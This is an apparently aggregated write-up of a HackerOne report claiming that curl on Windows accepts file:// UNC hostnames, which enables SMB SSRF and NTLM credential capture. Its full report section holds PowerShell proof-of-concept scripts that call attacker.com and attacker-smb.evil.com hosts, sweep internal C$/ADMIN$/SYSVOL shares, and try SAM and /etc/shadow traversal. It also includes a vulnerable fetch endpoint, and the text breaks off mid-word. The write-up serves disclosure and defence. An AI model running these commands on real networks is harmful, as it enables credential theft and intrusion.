# File URL UNC Path Access (Windows SSRF) in curl

## Metadata
- **Source:** HackerOne
- **Report:** 3470649 | https://hackerone.com/reports/3470649
- **Submitted:** 2025-12-18
- **Reporter:** im4x
- **Program:** curl
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Server-Side Request Forgery (SSRF), Path Traversal, Credential Theft, Insufficient Input Validation
- **CVEs:** None
- **Category:** web-api

## Summary
curl on Windows incorrectly handles file:// URLs by accepting UNC paths to remote servers (e.g., file://attacker.com/share/file.txt), allowing attackers to trigger SSRF attacks and credential theft via NTLM authentication. The vulnerability exists in lib/urlapi.c where hostname validation only restricts localhost/127.0.0.1 on non-Windows platforms, but Windows code permits arbitrary hostnames that are converted to UNC paths.

## Attack scenario
1. Attacker crafts a malicious file:// URL with a remote SMB server hostname (e.g., file://attacker.com/share/sensitive.txt)
2. Victim opens the URL in an application using curl library on Windows
3. curl interprets the URL as a valid UNC path and attempts to connect to the attacker-controlled SMB server
4. Windows SMB client automatically initiates NTLM authentication, sending victim's credentials to attacker
5. Attacker captures NTLMv2 hash or gains access to internal network shares (C$, ADMIN$, SYSVOL, etc.)
6. Attacker can crack credentials offline or pivot to other internal resources using compromised SMB access

## Root cause
The Windows-specific code path in lib/urlapi.c (lines 974-1030) validates hostnames by checking for disallowed characters but fails to restrict hostnames to localhost equivalents. The validation logic permits any hostname that doesn't contain reserved SMB characters, then passes it as a UNC path to Windows SMB protocol, bypassing intended security controls for local-only file:// access.

## Attacker mindset
An attacker would leverage this Windows-specific vulnerability to craft benign-looking file:// URLs in phishing emails or compromised websites. By controlling an SMB server or exploiting DNS/network positioning, they capture NTLM credentials or enumerate internal network shares (C$, ADMIN$, SYSVOL) without triggering traditional SSRF detection. The automatic NTLM authentication makes this particularly valuable for credential harvesting campaigns targeting Windows-based organizations.

## Defensive takeaways
- Restrict file:// URL handling on Windows to only localhost/127.0.0.1/::1 equivalents and local drive paths; reject any non-local hostnames
- Implement explicit UNC path rejection in file:// URL parsers to prevent Windows SMB protocol engagement via URL APIs
- Validate and sanitize all file:// URL inputs in applications using curl, especially in rendering engines and document processors
- Deploy network segmentation to prevent unauthentic SMB connections and monitor for unexpected NTLM authentication attempts
- Configure Windows Defender SmartScreen and similar tools to warn on file:// URLs with remote hostnames
- Disable NTLM authentication or require signing/encryption for SMB connections from untrusted sources
- Audit curl configurations and update to patched versions that restrict Windows file:// URL hostname handling

## Variant hunting
Search for similar path handling vulnerabilities in other URL parsers (Python urllib, Node.js url module, Golang net/url) on Windows. Examine browser handling of file:// URLs with UNC paths. Check for variants using alternative protocols that trigger SMB (e.g., smb://, cifs://, \\server\share syntax). Test file:// URL handling in document converters, archive tools, and media players. Investigate IPv6 loopback bypass (::1 vs 127.0.0.1 normalization) and DNS rebinding attacks against localhost restrictions.

## MITRE ATT&CK
- T1190
- T1566.002
- T1557.002
- T1040
- T1005
- T1021.002
- T1187

## Notes
This vulnerability is Windows-only due to SMB/UNC path semantics. The PoC demonstrates three critical impacts: SSRF to internal shares (C$, ADMIN$, SYSVOL), NTLM credential capture via Responder/relay attacks, and internal network enumeration. The vulnerability chains with phishing/social engineering to achieve credential harvesting at scale. CVSS 7.5 reflects high impact (credential theft, network access) with network attack vector but requires user interaction. Patch should normalize all non-localhost hostnames to be rejected or convert UNC paths to file:// safe equivalents without SMB invocation.

## Full report
<details><summary>Expand</summary>

## Vulnerability Details
- **CVSSv3:** 7.5 (High) - Windows only
- **File:** `lib/urlapi.c:974-1030`
- **Issue:** Windows file:// URLs accept UNC paths to remote servers
- **Impact:** SSRF, unauthorized network file access, credential theft

## Vulnerable Code
```c
// lib/urlapi.c:974-1030
if(ptr[0] != '/' && !STARTS_WITH_URL_DRIVE_PREFIX(ptr)) {
  /* the URL includes a hostname, it must match "localhost" or
     "127.0.0.1" to be valid */
  if(checkprefix("localhost/", ptr) ||
     checkprefix("127.0.0.1/", ptr)) {
    ptr += 9; /* now points to the slash after the host */
  }
#ifdef WIN32
  else {
    /* the hostname, NetBIOS computer name, can't contain disallowed chars */
    size_t len;
    len = strcspn(ptr, "/\\:*?\"<>|");
    if(ptr[len] == '\0' || ptr[len] == '/')
      /* only proceed if the hostname is valid */
      ;  // ACCEPTS UNC PATHS: file://hostname/share/path
    else
      return CURLUE_BAD_FILE_URL;
  }
#endif
```

## Root Cause
On Windows, curl allows `file://` URLs with hostnames other than localhost:
- `file://localhost/C:/file.txt` ✓ Safe (local file)
- `file://attacker.com/share/file.txt` ✓ **DANGEROUS** (UNC path to remote server)

This creates multiple security issues:
1. **SSRF**: Access to internal network shares
2. **Credential Theft**: NTLM authentication sent to attacker
3. **Path Traversal**: Access to arbitrary network resources

## Proof of Concept

### Prerequisites (Windows Only)
```powershell
# This vulnerability only affects Windows
# You need:
# - Windows machine with curl
# - SMB server (can be attacker-controlled)
# - Network access to SMB server
```

### Test 1: Basic UNC Path Access
```powershell
# PowerShell PoC
Write-Host "[*] Testing File URL UNC Path Access"

# Create test SMB share (requires admin)
New-SmbShare -Name "TestShare" -Path "C:\TestShare" -FullAccess "Everyone"
New-Item -Path "C:\TestShare\secret.txt" -ItemType File -Value "SECRET_DATA"

# Test local file access (normal)
curl.exe "file:///C:/Windows/System32/drivers/etc/hosts"
# Works as expected

# Test UNC path via file:// URL (VULNERABLE)
curl.exe "file://localhost/C$/Windows/System32/drivers/etc/hosts"
# Works - accesses admin share via UNC

# Test remote UNC path (SSRF)
curl.exe "file://127.0.0.1/TestShare/secret.txt"
# WORKS! Accesses network share via file:// URL
```

### Test 2: Remote Server SSRF
```powershell
#!/usr/bin/env pwsh
# Demonstrate SSRF to remote server

Write-Host "=== File URL UNC Path SSRF Demo ==="
Write-Host ""

# Scenario: Attacker controls attacker.com with SMB share
$attacker_server = "attacker.com"  # Replace with actual server
$malicious_url = "file://$attacker_server/public/malware.exe"

Write-Host "[*] User opens URL: $malicious_url"
Write-Host "[*] curl interprets this as UNC path: \\$attacker_server\public\malware.exe"
Write-Host ""

# curl attempts to access the UNC path
curl.exe --output downloaded.exe $malicious_url

if (Test-Path "downloaded.exe") {
    Write-Host "[!!!] VULNERABLE: File downloaded from remote SMB server!"
    Write-Host "[!!!] This is SSRF via file:// URL"
} else {
    Write-Host "[+] File not downloaded (connection failed or blocked)"
}
```

### Test 3: Credential Theft via NTLM
```powershell
#!/usr/bin/env pwsh
"""
Credential Theft PoC
When curl accesses UNC path, Windows automatically sends NTLM credentials
"""

Write-Host "=== NTLM Credential Theft Demo ==="
Write-Host ""

# Setup: Attacker runs Responder to capture NTLM hashes
# Responder.py -I eth0 -v

$attacker_server = "attacker-smb.evil.com"
$malicious_url = "file://$attacker_server/share/file.txt"

Write-Host "[*] Attacker provides URL: $malicious_url"
Write-Host "[*] User runs: curl $malicious_url"
Write-Host ""

# When curl tries to access this UNC path:
# 1. Windows SMB client connects to attacker-smb.evil.com
# 2. Windows automatically performs NTLM authentication
# 3. Attacker captures NTLMv2 hash
# 4. Attacker can crack hash offline

Write-Host "[!] Simulating curl access..."
# Note: This will send NTLM credentials to the attacker!
curl.exe --max-time 5 $malicious_url 2>&1 | Out-Null

Write-Host ""
Write-Host "[!!!] VULNERABILITY IMPACT:"
Write-Host "[!!!] - Windows sent NTLM credentials to $attacker_server"
Write-Host "[!!!] - Attacker captured NTLMv2 hash"
Write-Host "[!!!] - Hash can be cracked offline"
Write-Host ""

# Attacker's Responder output would show:
# [SMB] NTLMv2-SSP Client   : 192.168.1.100
# [SMB] NTLMv2-SSP Username : DOMAIN\victim
# [SMB] NTLMv2-SSP Hash     : victim::DOMAIN:1122334455667788:ABC123...
```

### Test 4: Internal Network Enumeration
```powershell
#!/usr/bin/env pwsh
# Use file:// URLs to enumerate internal network shares

Write-Host "=== Internal Network Enumeration via File URLs ==="
Write-Host ""

# Common Windows share names
$common_shares = @("C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON")

# Internal network ranges
$internal_ips = @(
    "192.168.1.1",
    "10.0.0.1",
    "172.16.0.1",
    "fileserver.internal.corp",
    "dc01.internal.corp"
)

foreach ($ip in $internal_ips) {
    Write-Host "[*] Testing $ip..."

    foreach ($share in $common_shares) {
        $url = "file://$ip/$share/"

        # Try to list directory
        $result = curl.exe --max-time 2 --silent $url 2>&1

        if ($LASTEXITCODE -eq 0) {
            Write-Host "  [!!!] ACCESSIBLE: $url"
        }
    }
}

Write-Host ""
Write-Host "[!!!] Successfully enumerated accessible network shares"
Write-Host "[!!!] This is SSRF - accessing internal network via file:// URLs"
```

### Test 5: Path Traversal Combined with UNC
```powershell
# Combine UNC paths with path traversal

# Access admin share
curl.exe "file://localhost/C$/Windows/System32/config/SAM"
# Attempts to read SAM database via UNC path

# Access network path with traversal
curl.exe "file://fileserver/share/../../../etc/shadow"
# Path traversal through UNC path

# Multiple levels
curl.exe "file://internal-server/public/../../../../windows/system32/config/SAM"
```

## Attack Scenarios

### Scenario 1: Web Application SSRF
```python
#!/usr/bin/env python3
"""
Web application that allows users to specify URLs for curl to fetch
Attacker exploits this to access internal network via file:// UNC paths
"""

# Vulnerable web application:
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    # VULNERABLE: No validation of URL scheme
    result = subprocess.check_output(['curl', url])
    return result

# Attacker request:
# GET /fetch?url=file://internal-fileserver/hr/salaries.xlsx
# Response: Contents of internal HR file!

# Or:
# GET /fetch?url=file://dc01.corp.internal/SYSVOL/
# Response: Active Directory SYSVOL contents
```

### Scenario 2: Automated Download Script
```powershell
# Vulnerable download script
# download.ps1
param($url)

Write-Host "Downloading from $url..."
curl.exe -o download.dat $url

# User runs:
# .\download.ps1 "file://attacker.com/malware/payload.exe"

# Result:
# 1. curl connects to \\attacker.com\malware\payload.exe
# 2. Windows sends NTLM credentials
# 3. Attacker logs credentials
# 4. Malware is downloaded
```

### Scenario 3: CI/CD Pipeline Exploitation
```yaml
# .gitlab-ci.yml or similar
fetch_data:
  script:
    - curl -o data.json ${DATA_URL}

# Attacker sets DATA_URL environment variable:
# DATA_URL=file://internal-jenkins/credentials/secrets.json

# Result:
# - CI/CD job accesses internal Jenkins server
# - Credentials are exfiltrated
```

## Detection

### Network Monitoring
```powershell
# Monitor for unexpected SMB connections
Get-SmbConnection | Where-Object {$_.ServerName -notlike "*expected*"}

# Check firewall logs for outbound SMB (port 445)
Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*SMB*"}
```

### Process Monitoring
```powershell
# Monitor curl.exe command lines for file:// URLs
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    ID=4104
} | Where-Object {$_.Message -like "*curl*file://*"}
```

### File System Auditing
```powershell
# Enabl

</details>

---
*Analysed by Claude on 2026-05-24*
